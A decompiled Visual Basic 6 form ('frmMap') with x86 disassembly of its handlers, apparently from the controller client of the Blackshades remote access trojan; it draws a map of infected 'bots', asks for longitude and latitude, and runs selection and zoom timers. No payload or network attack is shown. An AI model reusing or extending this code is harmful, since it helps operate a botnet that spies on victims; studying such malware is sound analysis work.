VERSION 5.00
Begin VB.Form frmMap
  Caption = "Map view"
  ScaleMode = 3
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 3 'Fixed Dialog
  Icon = "frmMap.frx":0
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 45
  ClientTop = 255
  ClientWidth = 9885
  ClientHeight = 6720
  StartUpPosition = 2 'CenterScreen
  Begin VB.PictureBox pic
    BackColor = &HFFFFFF&
    Picture = "frmMap.frx":8E79
    ForeColor = &H80000008&
    Left = 360
    Top = 120
    Width = 28755
    Height = 19920
    TabIndex = 0
    ScaleMode = 1
    AutoRedraw = True
    FontTransparent = True
    DrawStyle = 1
    Appearance = 0 'Flat
    Begin VB.Timer tmrSelection
      Enabled = 0   'False
      Interval = 10
      Left = 120
      Top = 0
    End
    Begin VB.Timer tmrOffDaemons
      Interval = 300
      Left = 1200
      Top = 0
    End
    Begin bss_client.uBot uBot
      Index = 0
      Left = 4440
      Top = 3840
      Width = 60
      Height = 60
      Visible = 0   'False
    End
    Begin bss_client.uDaemon uMaster
      Index = 0
      Left = 4560
      Top = 3840
      Width = 60
      Height = 60
      Visible = 0   'False
    End
    Begin VB.Label lblZoomHelp
      Caption = "(Z = in, X = out)"
      ForeColor = &HFFFFFF&
      Left = 1440
      Top = 120
      Width = 1575
      Height = 135
      TabIndex = 9
      BackStyle = 0 'Transparent
      BeginProperty Font
        Name = "Terminal"
        Size = 6
        Charset = 255
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin VB.Line lnLinkBot
      Index = 0
      BorderColor = &H808080&
      X1 = 1680
      Y1 = 1680
      X2 = 3480
      Y2 = 1680
      Visible = 0   'False
    End
    Begin VB.Line lnLinkGui
      Index = 0
      BorderColor = &HC000&
      X1 = 1680
      Y1 = 1800
      X2 = 3480
      Y2 = 1800
      Visible = 0   'False
      BorderWidth = 2
    End
    Begin VB.Label lblZoom
      Caption = "Zoom level: 0"
      ForeColor = &HFFFFFF&
      Left = 120
      Top = 120
      Width = 1335
      Height = 135
      TabIndex = 2
      BackStyle = 0 'Transparent
      BeginProperty Font
        Name = "Terminal"
        Size = 6
        Charset = 255
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
    Begin VB.Line lnSelection
      Index = 3
      BorderColor = &HFF0000&
      X1 = 2040
      Y1 = 2520
      X2 = 3120
      Y2 = 2520
      Visible = 0   'False
      BorderStyle = 3 'Dot
    End
    Begin VB.Line lnSelection
      Index = 2
      BorderColor = &HFF0000&
      X1 = 2040
      Y1 = 2400
      X2 = 3120
      Y2 = 2400
      Visible = 0   'False
      BorderStyle = 3 'Dot
    End
    Begin VB.Line lnSelection
      Index = 1
      BorderColor = &HFF0000&
      X1 = 2040
      Y1 = 2280
      X2 = 3120
      Y2 = 2280
      Visible = 0   'False
      BorderStyle = 3 'Dot
    End
    Begin VB.Line lnSelection
      Index = 0
      BorderColor = &HFF0000&
      X1 = 2040
      Y1 = 2160
      X2 = 3120
      Y2 = 2160
      Visible = 0   'False
      BorderStyle = 3 'Dot
    End
    Begin VB.Label lblSelection
      Caption = "No selection..."
      ForeColor = &HFFFFFF&
      Left = 80
      Top = 6440
      Width = 3615
      Height = 135
      TabIndex = 1
      BackStyle = 0 'Transparent
      BeginProperty Font
        Name = "Terminal"
        Size = 6
        Charset = 255
        Weight = 700
        Underline = 0 'False
        Italic = 0 'False
        Strikethrough = 0 'False
      EndProperty
    End
  End
  Begin VB.PictureBox Picholder
    Left = 240
    Top = 0
    Width = 9855
    Height = 6735
    Visible = 0   'False
    TabIndex = 3
    ScaleMode = 3
    AutoRedraw = True
    FontTransparent = True
    ClipControls = 0   'False
    Begin VB.HScrollBar scrVertical
      Left = 4680
      Top = 1320
      Width = 615
      Height = 255
      Visible = 0   'False
      TabIndex = 8
    End
    Begin VB.VScrollBar scrHoristontal
      Left = 5280
      Top = 1080
      Width = 255
      Height = 495
      Visible = 0   'False
      TabIndex = 7
      Tag = "FFTF"
    End
    Begin VB.HScrollBar scrZoom
      Left = 4680
      Top = 1080
      Width = 615
      Height = 255
      Visible = 0   'False
      TabIndex = 6
      Min = 20
      Max = 500
      LargeChange = 10
      Value = 100
    End
    Begin VB.PictureBox Zoom_Ori
      Left = 3840
      Top = 1080
      Width = 735
      Height = 495
      Visible = 0   'False
      TabIndex = 5
      ScaleMode = 1
      AutoRedraw = False
      FontTransparent = True
    End
    Begin VB.PictureBox picHidden
      Left = 3720
      Top = 1560
      Width = 972
      Height = 732
      Visible = 0   'False
      TabIndex = 4
      ScaleMode = 1
      AutoRedraw = True
      FontTransparent = True
    End
  End
  Begin VB.Timer tmrZoomCaption
    Enabled = 0   'False
    Interval = 10
    Left = 2040
    Top = 0
  End
  Begin VB.Timer tmrSelBots
    Interval = 500
    Left = 2160
    Top = 0
  End
  Begin VB.Menu mnuLocation
    Index = 0
    Visible = 0   'False
    Caption = "Set Longitude/Latitude"
  End
End

Attribute VB_Name = "frmMap"


Private sub mnuLocation__87955A
0087955A: push ebp
0087955B: mov ebp, esp
0087955D: sub esp, 0000000Ch
00879560: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00879565: mov eax, fs:[00h]
0087956B: push eax
0087956C: mov fs:[00000000h], esp
00879573: mov eax, 0000014Ch
00879578: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087957D: push ebx
0087957E: push esi
0087957F: push edi
00879580: mov var_0C, esp
00879583: mov var_08, 0040D770h
0087958A: mov eax, [ebp+08h]
0087958D: and eax, 00000001h
00879590: mov var_04, eax
00879593: mov eax, [ebp+08h]
00879596: and al, FEh
00879598: mov [ebp+08h], eax
0087959B: mov eax, [ebp+08h]
0087959E: mov eax, [eax]
008795A0: push [ebp+08h]
008795A3: call [eax+04h]
008795A6: push 00000008h
008795A8: push 00457C0Ch
008795AD: lea eax, var_2C
008795B0: push eax
008795B1: call 00410B4Ah ; msvbvm60.dll.__vbaAryConstruct2
008795B6: mov eax, [ebp+0Ch]
008795B9: mov ax, [eax]
008795BC: mov var_00000138, ax
008795C3: movsx eax, word ptr var_00000138
008795CA: mov var_00000144, eax
008795D0: cmp var_00000144, 00000000h
008795D7: jz 8795DEh
008795D9: jmp 008799F7h
008795DE: mov var_000000A0, 80020004h
008795E8: mov var_000000A8, 0000000Ah
008795F2: mov var_00000090, 80020004h
008795FC: mov var_00000098, 0000000Ah
00879606: mov var_80, 80020004h
0087960D: mov var_00000088, 0000000Ah
00879617: mov var_70, 80020004h
0087961E: mov var_78, 0000000Ah
00879625: mov var_60, 80020004h
0087962C: mov var_68, 0000000Ah
00879633: mov var_50, 80020004h
0087963A: mov var_58, 0000000Ah
00879641: mov var_000000B0, 00457B68h ; Enter your longitude position
0087964B: mov var_000000B8, 00000008h
00879655: lea edx, var_000000B8
0087965B: lea ecx, var_48
0087965E: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00879663: and var_0000012C, 00000000h
0087966A: cmp var_0000012C, 00000002h
00879671: jnb 87967Ch
00879673: and var_00000148, 00000000h
0087967A: jmp 879687h
0087967C: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
00879681: mov var_00000148, eax
00879687: lea eax, var_000000A8
0087968D: push eax
0087968E: lea eax, var_00000098
00879694: push eax
00879695: lea eax, var_00000088
0087969B: push eax
0087969C: lea eax, var_78
0087969F: push eax
008796A0: lea eax, var_68
008796A3: push eax
008796A4: lea eax, var_58
008796A7: push eax
008796A8: lea eax, var_48
008796AB: push eax
008796AC: call 00410994h ; InputBox
008796B1: mov edx, eax
008796B3: lea ecx, var_34
008796B6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008796BB: push eax
008796BC: call 004109DCh ; Val(arg_1)
008796C1: push ecx
008796C2: push ecx
008796C3: fstp real8 ptr [esp]
008796C6: call 00410790h ; msvbvm60.dll.__vbaStrR8
008796CB: mov edx, eax
008796CD: lea ecx, var_38
008796D0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008796D5: mov edx, eax
008796D7: mov eax, var_0000012C
008796DD: mov ecx, var_20
008796E0: lea ecx, [ecx+eax*4]
008796E3: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008796E8: lea eax, var_38
008796EB: push eax
008796EC: lea eax, var_34
008796EF: push eax
008796F0: push 00000002h
008796F2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008796F7: add esp, 0000000Ch
008796FA: lea eax, var_000000A8
00879700: push eax
00879701: lea eax, var_00000098
00879707: push eax
00879708: lea eax, var_00000088
0087970E: push eax
0087970F: lea eax, var_78
00879712: push eax
00879713: lea eax, var_68
00879716: push eax
00879717: lea eax, var_58
0087971A: push eax
0087971B: lea eax, var_48
0087971E: push eax
0087971F: push 00000007h
00879721: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00879726: add esp, 00000020h
00879729: and var_0000012C, 00000000h
00879730: cmp var_0000012C, 00000002h
00879737: jnb 879742h
00879739: and var_0000014C, 00000000h
00879740: jmp 87974Dh
00879742: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
00879747: mov var_0000014C, eax
0087974D: mov eax, var_0000012C
00879753: mov ecx, var_20
00879756: push [ecx+eax*4]
00879759: call 004109DCh ; Val(arg_1)
0087975E: call 004109D6h ; msvbvm60.dll.__vbaFpR8
00879763: fcomp real8 ptr [00401770h]
00879769: fstsw ax
0087976B: sahf 
0087976C: jnz 879773h
0087976E: jmp 008799F7h
00879773: mov var_000000A0, 80020004h
0087977D: mov var_000000A8, 0000000Ah
00879787: mov var_00000090, 80020004h
00879791: mov var_00000098, 0000000Ah
0087979B: mov var_80, 80020004h
008797A2: mov var_00000088, 0000000Ah
008797AC: mov var_70, 80020004h
008797B3: mov var_78, 0000000Ah
008797BA: mov var_60, 80020004h
008797C1: mov var_68, 0000000Ah
008797C8: mov var_50, 80020004h
008797CF: mov var_58, 0000000Ah
008797D6: mov var_000000B0, 00457BA8h ; Enter your latitude position
008797E0: mov var_000000B8, 00000008h
008797EA: lea edx, var_000000B8
008797F0: lea ecx, var_48
008797F3: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008797F8: mov var_0000012C, 00000001h
00879802: cmp var_0000012C, 00000002h
00879809: jnb 879814h
0087980B: and var_00000150, 00000000h
00879812: jmp 87981Fh
00879814: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
00879819: mov var_00000150, eax
0087981F: lea eax, var_000000A8
00879825: push eax
00879826: lea eax, var_00000098
0087982C: push eax
0087982D: lea eax, var_00000088
00879833: push eax
00879834: lea eax, var_78
00879837: push eax
00879838: lea eax, var_68
0087983B: push eax
0087983C: lea eax, var_58
0087983F: push eax
00879840: lea eax, var_48
00879843: push eax
00879844: call 00410994h ; InputBox
00879849: mov edx, eax
0087984B: lea ecx, var_34
0087984E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00879853: push eax
00879854: call 004109DCh ; Val(arg_1)
00879859: push ecx
0087985A: push ecx
0087985B: fstp real8 ptr [esp]
0087985E: call 00410790h ; msvbvm60.dll.__vbaStrR8
00879863: mov edx, eax
00879865: lea ecx, var_38
00879868: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0087986D: mov edx, eax
0087986F: mov eax, var_0000012C
00879875: mov ecx, var_20
00879878: lea ecx, [ecx+eax*4]
0087987B: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00879880: lea eax, var_38
00879883: push eax
00879884: lea eax, var_34
00879887: push eax
00879888: push 00000002h
0087988A: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0087988F: add esp, 0000000Ch
00879892: lea eax, var_000000A8
00879898: push eax
00879899: lea eax, var_00000098
0087989F: push eax
008798A0: lea eax, var_00000088
008798A6: push eax
008798A7: lea eax, var_78
008798AA: push eax
008798AB: lea eax, var_68
008798AE: push eax
008798AF: lea eax, var_58
008798B2: push eax
008798B3: lea eax, var_48
008798B6: push eax
008798B7: push 00000007h
008798B9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008798BE: add esp, 00000020h
008798C1: mov var_0000012C, 00000001h
008798CB: cmp var_0000012C, 00000002h
008798D2: jnb 8798DDh
008798D4: and var_00000154, 00000000h
008798DB: jmp 8798E8h
008798DD: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
008798E2: mov var_00000154, eax
008798E8: mov eax, var_0000012C
008798EE: mov ecx, var_20
008798F1: push [ecx+eax*4]
008798F4: call 004109DCh ; Val(arg_1)
008798F9: call 004109D6h ; msvbvm60.dll.__vbaFpR8
008798FE: fcomp real8 ptr [00401770h]
00879904: fstsw ax
00879906: sahf 
00879907: jnz 87990Eh
00879909: jmp 008799F7h
0087990E: and var_00000124, 00000000h
00879915: and var_00000120, 00000000h
0087991C: mov var_00000130, 00000001h
00879926: cmp var_00000130, 00000002h
0087992D: jnb 879938h
0087992F: and var_00000158, 00000000h
00879936: jmp 879943h
00879938: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
0087993D: mov var_00000158, eax
00879943: mov eax, var_00000130
00879949: mov ecx, var_20
0087994C: push [ecx+eax*4]
0087994F: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
00879954: mov var_0000011C, eax
0087995A: and var_0000012C, 00000000h
00879961: cmp var_0000012C, 00000002h
00879968: jnb 879973h
0087996A: and var_0000015C, 00000000h
00879971: jmp 87997Eh
00879973: call 00410826h ; msvbvm60.dll.__vbaGenerateBoundsError
00879978: mov var_0000015C, eax
0087997E: lea eax, var_00000128
00879984: push eax
00879985: lea eax, var_00000124
0087998B: push eax
0087998C: lea eax, var_00000120
00879992: push eax
00879993: lea eax, var_0000011C
00879999: push eax
0087999A: mov eax, var_0000012C
008799A0: mov ecx, var_20
008799A3: push [ecx+eax*4]
008799A6: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
008799AB: push eax
008799AC: push 00457BE8h ; Blackshades NET
008799B1: push 00000002h
008799B3: mov eax, [ebp+08h]
008799B6: mov eax, [eax]
008799B8: push [ebp+08h]
008799BB: call [eax+000006FCh]
008799C1: mov var_00000134, eax
008799C7: cmp var_00000134, 00000000h
008799CE: jnl 8799F0h
008799D0: push 000006FCh
008799D5: push 00441844h
008799DA: push [ebp+08h]
008799DD: push var_00000134
008799E3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008799E8: mov var_00000160, eax
008799EE: jmp 8799F7h
008799F0: and var_00000160, 00000000h
008799F7: mov var_04, 00000000h
008799FE: wait 
008799FF: push 00879A60h
00879A04: jmp 879A48h
00879A06: lea eax, var_38
00879A09: push eax
00879A0A: lea eax, var_34
00879A0D: push eax
00879A0E: push 00000002h
00879A10: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00879A15: add esp, 0000000Ch
00879A18: lea eax, var_000000A8
00879A1E: push eax
00879A1F: lea eax, var_00000098
00879A25: push eax
00879A26: lea eax, var_00000088
00879A2C: push eax
00879A2D: lea eax, var_78
00879A30: push eax
00879A31: lea eax, var_68
00879A34: push eax
00879A35: lea eax, var_58
00879A38: push eax
00879A39: lea eax, var_48
00879A3C: push eax
00879A3D: push 00000007h
00879A3F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00879A44: add esp, 00000020h
00879A47: ret 
End Sub

Private sub tmrSelection__8812F1
008812F1: push ebp
008812F2: mov ebp, esp
008812F4: sub esp, 0000000Ch
008812F7: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008812FC: mov eax, fs:[00h]
00881302: push eax
00881303: mov fs:[00000000h], esp
0088130A: mov eax, 000000C4h
0088130F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00881314: push ebx
00881315: push esi
00881316: push edi
00881317: mov var_0C, esp
0088131A: mov var_08, 0040DAA8h
00881321: mov eax, [ebp+08h]
00881324: and eax, 00000001h
00881327: mov var_04, eax
0088132A: mov eax, [ebp+08h]
0088132D: and al, FEh
0088132F: mov [ebp+08h], eax
00881332: mov eax, [ebp+08h]
00881335: mov eax, [eax]
00881337: push [ebp+08h]
0088133A: call [eax+04h]
0088133D: mov eax, [ebp+08h]
00881340: mov eax, [eax]
00881342: push [ebp+08h]
00881345: call [eax+00000300h]
0088134B: push eax
0088134C: lea eax, var_24
0088134F: push eax
00881350: call 00410A84h ; Set (object)
00881355: mov var_00000090, eax
0088135B: lea eax, var_18
0088135E: push eax
0088135F: mov eax, var_00000090
00881365: mov eax, [eax]
00881367: push var_00000090
0088136D: call [eax+70h]
00881370: fclex 
00881372: mov var_00000094, eax
00881378: cmp var_00000094, 00000000h
0088137F: jnl 8813A1h
00881381: push 00000070h
00881383: push 00447A20h
00881388: push var_00000090
0088138E: push var_00000094
00881394: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881399: mov var_000000BC, eax
0088139F: jmp 8813A8h
008813A1: and var_000000BC, 00000000h
008813A8: push var_18
008813AB: call 0041098Eh ; Len(arg_1)
008813B0: neg eax
008813B2: sbb eax, eax
008813B4: inc eax
008813B5: neg eax
008813B7: mov var_00000098, ax
008813BE: lea ecx, var_18
008813C1: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008813C6: lea ecx, var_24
008813C9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008813CE: movsx eax, word ptr var_00000098
008813D5: test eax, eax
008813D7: jz 88144Ah
008813D9: mov eax, [ebp+08h]
008813DC: mov eax, [eax]
008813DE: push [ebp+08h]
008813E1: call [eax+00000300h]
008813E7: push eax
008813E8: lea eax, var_24
008813EB: push eax
008813EC: call 00410A84h ; Set (object)
008813F1: mov var_00000090, eax
008813F7: push 00000000h
008813F9: mov eax, var_00000090
008813FF: mov eax, [eax]
00881401: push var_00000090
00881407: call [eax+5Ch]
0088140A: fclex 
0088140C: mov var_00000094, eax
00881412: cmp var_00000094, 00000000h
00881419: jnl 88143Bh
0088141B: push 0000005Ch
0088141D: push 00447A20h
00881422: push var_00000090
00881428: push var_00000094
0088142E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881433: mov var_000000C0, eax
00881439: jmp 881442h
0088143B: and var_000000C0, 00000000h
00881442: lea ecx, var_24
00881445: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0088144A: mov eax, [ebp+08h]
0088144D: mov eax, [eax]
0088144F: push [ebp+08h]
00881452: call [eax+00000300h]
00881458: push eax
00881459: lea eax, var_28
0088145C: push eax
0088145D: call 00410A84h ; Set (object)
00881462: mov var_00000090, eax
00881468: lea eax, var_1C
0088146B: push eax
0088146C: mov eax, var_00000090
00881472: mov eax, [eax]
00881474: push var_00000090
0088147A: call [eax+70h]
0088147D: fclex 
0088147F: mov var_00000094, eax
00881485: cmp var_00000094, 00000000h
0088148C: jnl 8814AEh
0088148E: push 00000070h
00881490: push 00447A20h
00881495: push var_00000090
0088149B: push var_00000094
008814A1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008814A6: mov var_000000C4, eax
008814AC: jmp 8814B5h
008814AE: and var_000000C4, 00000000h
008814B5: mov eax, [ebp+08h]
008814B8: mov eax, [eax]
008814BA: push [ebp+08h]
008814BD: call [eax+00000324h]
008814C3: push eax
008814C4: lea eax, var_2C
008814C7: push eax
008814C8: call 00410A84h ; Set (object)
008814CD: mov var_000000A0, eax
008814D3: mov eax, [ebp+08h]
008814D6: mov eax, [eax]
008814D8: push [ebp+08h]
008814DB: call [eax+00000324h]
008814E1: push eax
008814E2: lea eax, var_24
008814E5: push eax
008814E6: call 00410A84h ; Set (object)
008814EB: mov var_00000098, eax
008814F1: lea eax, var_18
008814F4: push eax
008814F5: mov eax, var_00000098
008814FB: mov eax, [eax]
008814FD: push var_00000098
00881503: call [eax+50h]
00881506: fclex 
00881508: mov var_0000009C, eax
0088150E: cmp var_0000009C, 00000000h
00881515: jnl 881537h
00881517: push 00000050h
00881519: push 004425E4h
0088151E: push var_00000098
00881524: push var_0000009C
0088152A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088152F: mov var_000000C8, eax
00881535: jmp 88153Eh
00881537: and var_000000C8, 00000000h
0088153E: mov eax, var_18
00881541: mov var_000000B0, eax
00881547: and var_18, 00000000h
0088154B: mov eax, var_000000B0
00881551: mov var_64, eax
00881554: mov var_6C, 00000008h
0088155B: mov var_44, 00000001h
00881562: mov var_4C, 00000002h
00881569: mov eax, var_1C
0088156C: mov var_000000B4, eax
00881572: and var_1C, 00000000h
00881576: mov eax, var_000000B4
0088157C: mov var_34, eax
0088157F: mov var_3C, 00000008h
00881586: lea eax, var_4C
00881589: push eax
0088158A: push 00000001h
0088158C: lea eax, var_3C
0088158F: push eax
00881590: lea eax, var_5C
00881593: push eax
00881594: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
00881599: lea eax, var_6C
0088159C: push eax
0088159D: lea eax, var_5C
008815A0: push eax
008815A1: lea eax, var_7C
008815A4: push eax
008815A5: call 004109F4h ; msvbvm60.dll.__vbaVarCat
008815AA: push eax
008815AB: lea eax, var_20
008815AE: push eax
008815AF: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
008815B4: push eax
008815B5: mov eax, var_000000A0
008815BB: mov eax, [eax]
008815BD: push var_000000A0
008815C3: call [eax+54h]
008815C6: fclex 
008815C8: mov var_000000A4, eax
008815CE: cmp var_000000A4, 00000000h
008815D5: jnl 8815F7h
008815D7: push 00000054h
008815D9: push 004425E4h
008815DE: push var_000000A0
008815E4: push var_000000A4
008815EA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008815EF: mov var_000000CC, eax
008815F5: jmp 8815FEh
008815F7: and var_000000CC, 00000000h
008815FE: lea ecx, var_20
00881601: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00881606: lea eax, var_2C
00881609: push eax
0088160A: lea eax, var_28
0088160D: push eax
0088160E: lea eax, var_24
00881611: push eax
00881612: push 00000003h
00881614: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00881619: add esp, 00000010h
0088161C: lea eax, var_7C
0088161F: push eax
00881620: lea eax, var_5C
00881623: push eax
00881624: lea eax, var_6C
00881627: push eax
00881628: lea eax, var_4C
0088162B: push eax
0088162C: lea eax, var_3C
0088162F: push eax
00881630: push 00000005h
00881632: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881637: add esp, 00000018h
0088163A: mov eax, [ebp+08h]
0088163D: mov eax, [eax]
0088163F: push [ebp+08h]
00881642: call [eax+00000300h]
00881648: push eax
00881649: lea eax, var_24
0088164C: push eax
0088164D: call 00410A84h ; Set (object)
00881652: mov var_00000090, eax
00881658: lea eax, var_18
0088165B: push eax
0088165C: mov eax, var_00000090
00881662: mov eax, [eax]
00881664: push var_00000090
0088166A: call [eax+70h]
0088166D: fclex 
0088166F: mov var_00000094, eax
00881675: cmp var_00000094, 00000000h
0088167C: jnl 88169Eh
0088167E: push 00000070h
00881680: push 00447A20h
00881685: push var_00000090
0088168B: push var_00000094
00881691: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881696: mov var_000000D0, eax
0088169C: jmp 8816A5h
0088169E: and var_000000D0, 00000000h
008816A5: mov eax, [ebp+08h]
008816A8: mov eax, [eax]
008816AA: push [ebp+08h]
008816AD: call [eax+00000300h]
008816B3: push eax
008816B4: lea eax, var_2C
008816B7: push eax
008816B8: call 00410A84h ; Set (object)
008816BD: mov var_000000A0, eax
008816C3: mov eax, [ebp+08h]
008816C6: mov eax, [eax]
008816C8: push [ebp+08h]
008816CB: call [eax+00000300h]
008816D1: push eax
008816D2: lea eax, var_28
008816D5: push eax
008816D6: call 00410A84h ; Set (object)
008816DB: mov var_00000098, eax
008816E1: lea eax, var_1C
008816E4: push eax
008816E5: mov eax, var_00000098
008816EB: mov eax, [eax]
008816ED: push var_00000098
008816F3: call [eax+70h]
008816F6: fclex 
008816F8: mov var_0000009C, eax
008816FE: cmp var_0000009C, 00000000h
00881705: jnl 881727h
00881707: push 00000070h
00881709: push 00447A20h
0088170E: push var_00000098
00881714: push var_0000009C
0088171A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088171F: mov var_000000D4, eax
00881725: jmp 88172Eh
00881727: and var_000000D4, 00000000h
0088172E: push var_1C
00881731: call 0041098Eh ; Len(arg_1)
00881736: mov var_44, eax
00881739: mov var_4C, 00000003h
00881740: mov eax, var_18
00881743: mov var_000000B8, eax
00881749: and var_18, 00000000h
0088174D: mov eax, var_000000B8
00881753: mov var_34, eax
00881756: mov var_3C, 00000008h
0088175D: lea eax, var_4C
00881760: push eax
00881761: push 00000002h
00881763: lea eax, var_3C
00881766: push eax
00881767: lea eax, var_5C
0088176A: push eax
0088176B: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
00881770: lea eax, var_5C
00881773: push eax
00881774: lea eax, var_20
00881777: push eax
00881778: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
0088177D: push eax
0088177E: mov eax, var_000000A0
00881784: mov eax, [eax]
00881786: push var_000000A0
0088178C: call [eax+74h]
0088178F: fclex 
00881791: mov var_000000A4, eax
00881797: cmp var_000000A4, 00000000h
0088179E: jnl 8817C0h
008817A0: push 00000074h
008817A2: push 00447A20h
008817A7: push var_000000A0
008817AD: push var_000000A4
008817B3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008817B8: mov var_000000D8, eax
008817BE: jmp 8817C7h
008817C0: and var_000000D8, 00000000h
008817C7: lea eax, var_20
008817CA: push eax
008817CB: lea eax, var_1C
008817CE: push eax
008817CF: push 00000002h
008817D1: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008817D6: add esp, 0000000Ch
008817D9: lea eax, var_2C
008817DC: push eax
008817DD: lea eax, var_28
008817E0: push eax
008817E1: lea eax, var_24
008817E4: push eax
008817E5: push 00000003h
008817E7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008817EC: add esp, 00000010h
008817EF: lea eax, var_5C
008817F2: push eax
008817F3: lea eax, var_4C
008817F6: push eax
008817F7: lea eax, var_3C
008817FA: push eax
008817FB: push 00000003h
008817FD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00881802: add esp, 00000010h
00881805: mov var_04, 00000000h
0088180C: push 0088185Fh
00881811: jmp 88185Eh
00881813: lea eax, var_20
00881816: push eax
00881817: lea eax, var_1C
0088181A: push eax
0088181B: lea eax, var_18
0088181E: push eax
0088181F: push 00000003h
00881821: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00881826: add esp, 00000010h
00881829: lea eax, var_2C
0088182C: push eax
0088182D: lea eax, var_28
00881830: push eax
00881831: lea eax, var_24
00881834: push eax
00881835: push 00000003h
00881837: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088183C: add esp, 00000010h
0088183F: lea eax, var_7C
00881842: push eax
00881843: lea eax, var_6C
00881846: push eax
00881847: lea eax, var_5C
0088184A: push eax
0088184B: lea eax, var_4C
0088184E: push eax
0088184F: lea eax, var_3C
00881852: push eax
00881853: push 00000005h
00881855: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0088185A: add esp, 00000018h
0088185D: ret 
End Sub

Private sub tmrZoomCaption__88187E
0088187E: push ebp
0088187F: mov ebp, esp
00881881: sub esp, 0000000Ch
00881884: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00881889: mov eax, fs:[00h]
0088188F: push eax
00881890: mov fs:[00000000h], esp
00881897: mov eax, 000000C4h
0088189C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008818A1: push ebx
008818A2: push esi
008818A3: push edi
008818A4: mov var_0C, esp
008818A7: mov var_08, 0040DAB8h
008818AE: mov eax, [ebp+08h]
008818B1: and eax, 00000001h
008818B4: mov var_04, eax
008818B7: mov eax, [ebp+08h]
008818BA: and al, FEh
008818BC: mov [ebp+08h], eax
008818BF: mov eax, [ebp+08h]
008818C2: mov eax, [eax]
008818C4: push [ebp+08h]
008818C7: call [eax+04h]
008818CA: mov eax, [ebp+08h]
008818CD: mov eax, [eax]
008818CF: push [ebp+08h]
008818D2: call [eax+00000340h]
008818D8: push eax
008818D9: lea eax, var_24
008818DC: push eax
008818DD: call 00410A84h ; Set (object)
008818E2: mov var_00000090, eax
008818E8: lea eax, var_18
008818EB: push eax
008818EC: mov eax, var_00000090
008818F2: mov eax, [eax]
008818F4: push var_00000090
008818FA: call [eax+70h]
008818FD: fclex 
008818FF: mov var_00000094, eax
00881905: cmp var_00000094, 00000000h
0088190C: jnl 88192Eh
0088190E: push 00000070h
00881910: push 00447A20h
00881915: push var_00000090
0088191B: push var_00000094
00881921: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00881926: mov var_000000BC, eax
0088192C: jmp 881935h
0088192E: and var_000000BC, 00000000h
00881935: push var_18
00881938: call 0041098Eh ; Len(arg_1)
0088193D: neg eax
0088193F: sbb eax, eax
00881941: inc eax
00881942: neg eax
00881944: mov var_00000098, ax
0088194B: lea ecx, var_18
0088194E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00881953: lea ecx, var_24
00881956: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0088195B: movsx eax, word ptr var_00000098
00881962: test eax, eax
00881964: jz 8819D7h
00881966: mov eax, [ebp+08h]
00881969: mov eax, [eax]
0088196B: push [ebp+08h]
0088196E: call [eax+00000340h]
00881974: push eax
00881975: lea eax, var_24
00881978: push eax
00881979: call 00410A84h ; Set (object)
0088197E: mov var_00000090, eax
00881984: push 00000000h
00881986: mov eax, var_00000090
0088198C: mov eax, [eax]
0088198E: push var_00000090
00881994: call [eax+5Ch]
00881997: fclex 
00881999: mov var_00000094, eax
